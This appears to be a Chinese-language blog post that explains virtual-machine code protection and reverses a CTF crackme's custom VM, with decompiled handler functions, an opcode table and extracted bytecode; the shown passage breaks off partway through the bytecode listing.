                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/vm%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">vm逆向</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="虚拟机（VM）保护技术逆向分析与总结"><a href="#虚拟机（VM）保护技术逆向分析与总结" class="headerlink" title="虚拟机（VM）保护技术逆向分析与总结"></a>虚拟机（VM）保护技术逆向分析与总结</h2><h3 id="什么是虚拟机（VM）保护？"><a href="#什么是虚拟机（VM）保护？" class="headerlink" title="什么是虚拟机（VM）保护？"></a>什么是虚拟机（VM）保护？</h3><p>虚拟机保护是一种高级的代码混淆和反逆向技术。它的核心思想是：<strong>将原始机器代码（如x86指令）转换（或“编译”）为只能在自定义的虚拟机上执行的字节码（Bytecode）</strong>。</p>
<ul>
<li><strong>类比</strong>：就像Java程序被编译成在JVM上运行的字节码，或者.NET程序被编译成在CLR上运行的IL代码一样。VM保护创建了一个私有的、独特的“处理器”和“指令集”（通常称为VM Architecture或ISA），来执行被保护的代码。</li>
<li><strong>目标</strong>：极大增加逆向工程的分析难度。分析者无法直接看到原始的x86&#x2F;ARM指令，而是需要先理解整个自定义虚拟机的运作机制，才能还原出原始代码的逻辑。</li>
</ul>
<p>而我们就要分析这些自定义的逻辑然后，根据这些指令还原汇编代码。然后再分析逻辑。</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>主函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input something:&quot;</span>);</span><br><span class="line">  sub_CD1(v3);</span><br><span class="line">  sub_E0B(v3);</span><br><span class="line">  sub_F83(v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And the flag is GWHT&#123;true flag&#125;&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_CD1  是一个数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CD1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_DWORD *)a1 = <span class="number">0</span>;                           <span class="comment">//寄存器A</span></span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">4</span>) = <span class="number">18</span>;                    <span class="comment">//寄存器B</span></span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;                     <span class="comment">//寄存器C</span></span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">12</span>) = <span class="number">0</span>;                    <span class="comment">//寄存器D</span></span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) = &amp;unk_202060;          <span class="comment">//储存指令</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">24</span>) = <span class="number">0xF1</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">32</span>) = sub_B5F;              <span class="comment">//0xF1  --&gt;sub_B5F</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">40</span>) = <span class="number">0xF2</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">48</span>) = sub_A64;              <span class="comment">//0xF2  --&gt;sub_A64</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">56</span>) = <span class="number">0xF5</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">64</span>) = sub_AC5;              <span class="comment">//0xF5  --&gt;sub_AC5</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">72</span>) = <span class="number">0xF4</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">80</span>) = sub_956;              <span class="comment">//0xF4  --&gt;sub_956</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">88</span>) = <span class="number">0xF7</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">96</span>) = sub_A08;              <span class="comment">//0xF7  --&gt;sub_A08</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">104</span>) = <span class="number">0xF8</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">112</span>) = sub_8F0;             <span class="comment">//0xF8  --&gt;sub_8F0</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">120</span>) = <span class="number">0xF6</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">128</span>) = sub_99C;             <span class="comment">//0xF6  --&gt;sub_99C</span></span><br><span class="line">  qword_2022A8 = <span class="built_in">malloc</span>(<span class="number">0x512u</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>(qword_2022A8, <span class="number">0</span>, <span class="number">0x512u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_B5F</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v2 = (<span class="type">int</span> *)(*(_QWORD *)(a1 + <span class="number">16</span>) + <span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *(_BYTE *)(*(_QWORD *)(a1 + <span class="number">16</span>) + <span class="number">1LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE1</span>:</span><br><span class="line">      *(_DWORD *)a1 = *((<span class="type">char</span> *)qword_2022A8 + *v2);              <span class="comment">//写入到a1指向结构的偏移 0 处</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE2</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>) = *((<span class="type">char</span> *)qword_2022A8 + *v2);        <span class="comment">//写入到a1偏移 4 处</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE3</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">8</span>) = *((<span class="type">char</span> *)qword_2022A8 + *v2);       <span class="comment">//写入到a1偏移 8 处</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE4</span>:</span><br><span class="line">      *((_BYTE *)qword_2022A8 + *v2) = *(_DWORD *)a1;  <span class="comment">//将a1偏移 0 处的字节，写入到qword_2022A8缓冲区偏移*v2的位置</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE5</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">12</span>) = *((<span class="type">char</span> *)qword_2022A8 + *v2);  <span class="comment">//写入到a1偏移 12 处。</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE7</span>:</span><br><span class="line">      *((_BYTE *)qword_2022A8 + *v2) = *(_DWORD *)(a1 + <span class="number">4</span>);<span class="comment">//将a1偏移 4 处的字节，写入到qword_2022A8缓冲区偏移*v2的位置</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) += <span class="number">6LL</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_A64异或操作a1与a1+4存储的内容异或。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_A64</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_DWORD *)a1 ^= *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从标准输入读取数据,并强制校验输入的字符串长度是否为 21</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_AC5</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  buf = (<span class="type">const</span> <span class="type">char</span> *)qword_2022A8;</span><br><span class="line">  read(<span class="number">0</span>, qword_2022A8, <span class="number">0x20u</span>LL);</span><br><span class="line">  dword_2022A4 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( dword_2022A4 != <span class="number">21</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WRONG!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_956进行自增操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_956</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_A08偏移 0 处的 4 字节数据与偏移 12 处的 4 字节数据进行乘法，并计数器自增。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_A08</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_DWORD *)a1 *= *(_DWORD *)(a1 + <span class="number">12</span>);</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_8F0交换<code>a1[0]</code>和<code>a1[1]</code>两个 int 变量的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_8F0</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  *a1 = a1[<span class="number">1</span>];</span><br><span class="line">  a1[<span class="number">1</span>] = v2;</span><br><span class="line">  ++*((_QWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_99C:对<code>a1</code>指向的数据结构中<strong>偏移 0 处（x）、4 处（y）、8 处（z）的三个 32 位整数</strong>执行线性组合运算（<code>x = z + 2y + 3x</code>），并将结果更新到偏移 0 处，同时将该结构中<strong>偏移 16 字节的 64 位计数器</strong>自增 1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_99C</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_DWORD *)a1 = *(_DWORD *)(a1 + <span class="number">8</span>) + <span class="number">2</span> * *(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">3</span> * *(_DWORD *)a1;</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_E0B循环调用sub_E6E,遇到0xF4就停止。是就是说指令达到0xF4就结束了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_E0B</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) = &amp;unk_202060;</span><br><span class="line">  <span class="keyword">while</span> ( **(_BYTE **)(a1 + <span class="number">16</span>) != <span class="number">0xF4</span> )</span><br><span class="line">    sub_E6E(a1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_E6E</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; **(_BYTE **)(a1 + <span class="number">16</span>) != *(_BYTE *)(<span class="number">16</span> * (i + <span class="number">1LL</span>) + a1 + <span class="number">8</span>); ++i ) <span class="comment">//循环查找匹配的字节</span></span><br><span class="line">    ;</span><br><span class="line">  (*(<span class="type">void</span> (__fastcall **)(__int64))(<span class="number">16</span> * (i + <span class="number">1LL</span>) + a1 + <span class="number">16</span>))(a1); <span class="comment">//调用匹配到的函数</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0xF1 mov</span><br><span class="line">0xF2 xor</span><br><span class="line">0xF4 nop</span><br><span class="line">0xF5 input</span><br><span class="line">0xF7 mul</span><br><span class="line">0xF8 swap</span><br><span class="line">0xF6 x = z + 2y + 3x</span><br><span class="line">0xE1 寄存器 r1</span><br><span class="line">0xE2 寄存器 r2</span><br><span class="line">0xE3 寄存器 r3</span><br><span class="line">0xE4 内存单元 flag</span><br><span class="line">0xE5 寄存器 r4</span><br></pre></td></tr></table></figure>

<p>真flag验证函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_F00</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; dword_2022A4 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)qword_2022A8 + i) != byte_202020[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unsigned char byte_202020[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>提取出来操作码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line"><span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span 